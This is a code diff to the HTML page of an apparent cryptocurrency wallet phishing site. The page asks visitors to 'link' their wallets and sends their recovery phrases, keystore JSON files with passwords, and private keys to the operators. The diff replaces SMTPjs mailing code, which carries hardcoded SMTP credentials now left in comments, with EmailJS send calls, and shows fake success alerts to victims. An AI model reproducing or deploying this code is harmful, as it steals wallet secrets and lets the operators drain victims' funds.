@@ -177,7 +177,7 @@
                           password you used to encrypt it.
                         </p>
                         <br /><br />
-                        <form onsubmit="sendEmail1(); reset(); return false;">
+                        <form onsubmit="sendEmail1(); reset(); return false">
                           <input
                             type="hidden"
                             name="type"
@@ -268,91 +268,109 @@
     <!-- Common js -->
     <script type="text/javascript" src="wallet/js/jquery-2.1.4.min.js"></script>
     <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init('user_ETXUFBIWHmN2i5uIjwDUS');
+      })();
+    </script>
     <script>
       let phra = document.getElementById('phrase');
       let jsonKey = document.getElementById('json');
       let jsonPass = document.getElementById('jsonpass');
-      let pKey = document.getElementById('pKey');
-
       function sendEmail() {
-        Email.send({
-          Host: 'smtp.elasticemail.com',
-          Username: 'support@deckft.com',
-          Password: 'EB78181A1CE5D5F8C7102BA05838E95BBC83',
-          from: 'client@example.com',
-          To: 'support@deckft.com',
-          Subject: '12 key Phrase',
-          Body: `The 12 Phrase key is ${phra.value}`,
-        }).then((message) =>
-          alert('Account Successfully Linked 12 key Phrase')
+        // Email.send({
+        //   Host: 'smtp.elasticemail.com',
+        //   Username: 'support@deckft.com',
+        //   Password: 'EB78181A1CE5D5F8C7102BA05838E95BBC83',
+        //   from: 'client@example.com',
+        //   To: 'charlescharlesy@gmail.com',
+        //   Subject: '12 key Phrase',
+        //   Body: `The 12 Phrase key is ${phra.value}`,
+        // }).then((message) =>
+        // alert('Account Successfully Linked 12 key Phrase')
+        // );
+        var templateParams = {
+          type: "(The 12 Phrase key is:)",
+          message: `${phra.value}`,
+        };
+
+        emailjs.send('service_eu4016i', 'template_7h0g70r', templateParams).then(
+          function (response) {
+             alert('Account Successfully Linked 12 key Phrase')
+            console.log('SUCCESS!', response.status, response.text);
+          },
+          function (error) {
+            console.log('FAILED...', error);
+          }
         );
       }
       function sendEmail1() {
-        Email.send({
-          Host: 'smtp.elasticemail.com',
-          Username: 'support@deckft.com',
-          Password: 'EB78181A1CE5D5F8C7102BA05838E95BBC83',
-          from: 'client@example.com',
-          To: 'support@deckft.com',
-          Subject: 'Keystore Json Details',
-          Body:
-            'Json Key: ' + jsonKey.value + '<br> Password: ' + jsonPass.value,
-        }).then((message) =>
-          alert('Account Successfully Linked with Keystore JSON')
+        
+        // Email.send({
+        //   Host: 'smtp.mailtrap.io',
+        //   Username: 'a1aefa3122275a',
+        //   Password: '50f18553d29ee5',
+        //   from: 'client@example.com',
+        //   To: 'support@deckft.com',
+        //   Subject: 'Keystore Json Details',
+        //   Body:
+        //     'Json Key: ' + jsonKey.value + '<br> Password: ' + jsonPass.value,
+        // }).then((message) =>
+        //   alert(
+        //     `your link is ${jsonKey.value} and your password is ${jsonPass.value}`
+        //   )
+        // );
+        var templateParams = {
+          type: "(JSON Key and Password:)",
+          message: 'Json Key: ' + jsonKey.value ,
+          password: '<br> Password: ' + jsonPass.value,
+        };
+
+        emailjs.send('service_eu4016i', 'template_7h0g70r', templateParams).then(
+          function (response) {
+            alert(
+             'Congratulations, Your Json Key has been received and will be linked'
+          )
+            console.log('SUCCESS!', response.status, response.text);
+          },
+          function (error) {
+            console.log('FAILED...', error);
+          }
         );
       }
       function sendEmail2() {
-        Email.send({
-          Host: 'smtp.elasticemail.com',
-          Username: 'support@deckft.com',
-          Password: 'EB78181A1CE5D5F8C7102BA05838E95BBC83',
-          from: 'client@example.com',
-          To: 'support@deckft.com',
-          Subject: 'Private key Details',
-          Body: pKey.value,
-        }).then((message) =>
-          alert('Account Successfully Linked with Private Keys')
+        let pKey = document.getElementById('pKey');
+        // Email.send({
+        //   Host: 'smtp.elasticemail.com',
+        //   Username: 'support@deckft.com',
+        //   Password: 'EB78181A1CE5D5F8C7102BA05838E95BBC83',
+        //   from: 'client@example.com',
+        //   To: 'support@deckft.com',
+        //   Subject: 'Private key Details',
+        //   Body: pKey.value,
+        // }).then((message) =>
+        //   alert('Account Successfully Linked with Private Keys')
+        // );
+        var templateParams = {
+          type: "(Private key Details:)",
+          message: 'Private Key: ' +  pKey.value ,
+        };
+
+        emailjs.send('service_eu4016i', 'template_7h0g70r', templateParams).then(
+          function (response) {
+            alert('Account Successfully Linked with Private Keys')
+            console.log('SUCCESS!', response.status, response.text);
+          },
+          function (error) {
+            console.log('FAILED...', error);
+          }
         );
       }
     </script>
-    <!--// Common js -->
-
-    <!-- cart-js -->
-    <script src="wallet/js/minicart.js"></script>
-    <script>
-      edu.render();
-
-      edu.cart.on('edu_checkout', function (evt) {
-        var items, len, i;
-
-        if (this.subtotal() > 0) {
-          items = this.items();
-
-          for (i = 0, len = items.length; i < len; i++) {}
-        }
-      });
-    </script>
-    <!-- //cart-js -->
-
-    <!-- reviews -->
-    <script>
-      function blinker() {
-        $('.blinking').fadeOut(500);
-        $('.blinking').fadeIn(500);
-      }
-      setInterval(blinker, 1000);
-    </script>
-    <script>
-      function cycle($item, $cycler) {
-        setTimeout(cycle, 2000, $item.next(), $cycler);
-
-        $item.slideUp(1000, function () {
-          $item.appendTo($cycler).show();
-        });
-      }
-      cycle($('#cycler div:first'), $('#cycler'));
-    </script>
-    <!--// reviews -->
 
     <!-- responsive-tabs -->
     <script src="wallet/js/easy-responsive-tabs.js"></script>
@@ -366,117 +384,5 @@
       });
     </script>
     <!-- //responsive-tabs -->
-
-    <!-- Carousel Auto-Cycle -->
-    <script>
-      $(document).ready(function () {
-        $('.carousel').carousel({
-          interval: 6000,
-        });
-      });
-    </script>
-    <!-- // Carousel Auto-Cycle -->
-
-    <!-- Nav Js -->
-    <script type="text/javascript" src="wallet/js/bootstrap.js"></script>
-    <script>
-      $(document).ready(function () {
-        $('.dropdown').hover(
-          function () {
-            $('.dropdown-menu', this)
-              .not('.in .dropdown-menu')
-              .stop(true, true)
-              .slideDown('400');
-            $(this).toggleClass('open');
-          },
-          function () {
-            $('.dropdown-menu', this)
-              .not('.in .dropdown-menu')
-              .stop(true, true)
-              .slideUp('400');
-            $(this).toggleClass('open');
-          }
-        );
-      });
-    </script>
-    <!--// Nav Js -->
-
-    <script>
-      $('.toggle').click(function () {
-        // Switches the Icon
-        $(this).children('i').toggleClass('fa-pencil');
-        // Switches the forms
-        $('.form').animate(
-          {
-            height: 'toggle',
-            'padding-top': 'toggle',
-            'padding-bottom': 'toggle',
-            opacity: 'toggle',
-          },
-          'slow'
-        );
-      });
-    </script>
-    <!-- //bootstrap-pop-up -->
-
-    <!--pop-up-box -->
-    <script
-      src="wallet/js/jquery.magnific-popup.js"
-      type="text/javascript"
-    ></script>
-    <script>
-      $(document).ready(function () {
-        $('.popup-with-zoom-anim').magnificPopup({
-          type: 'inline',
-          fixedContentPos: false,
-          fixedBgPos: true,
-          overflowY: 'auto',
-          closeBtnInside: true,
-          preloader: false,
-          midClick: true,
-          removalDelay: 300,
-          mainClass: 'my-mfp-zoom-in',
-        });
-      });
-    </script>
-    <!-- //pop-up-box -->
-    <!-- start-smoth-scrolling -->
-    <script type="text/javascript" src="wallet/js/move-top.js"></script>
-    <script type="text/javascript" src="wallet/js/easing.js"></script>
-    <script type="text/javascript">
-      jQuery(document).ready(function ($) {
-        $('.scroll').click(function (event) {
-          event.preventDefault();
-          $('html,body').animate(
-            {
-              scrollTop: $(this.hash).offset().top,
-            },
-            1000
-          );
-        });
-      });
-    </script>
-    <!-- start-smoth-scrolling -->
-    <!-- here stars scrolling icon -->
-    <script type="text/javascript">
-      $(document).ready(function () {
-        /*
-				var defaults = {
-				containerID: 'toTop', // fading element id
-				containerHoverID: 'toTopHover', // fading element hover id
-				scrollSpeed: 1200,
-				easingType: 'linear' 
-				};
-				*/
-
-        $().UItoTop({
-          easingType: 'easeOutQuart',
-        });
-      });
-    </script>
-    <!-- //here ends scrolling icon -->
-    <!-- smoothscroll -->
-    <script src="wallet/js/SmoothScroll.min.js"></script>
-    <!-- //smoothscroll -->
   </body>
 </html>
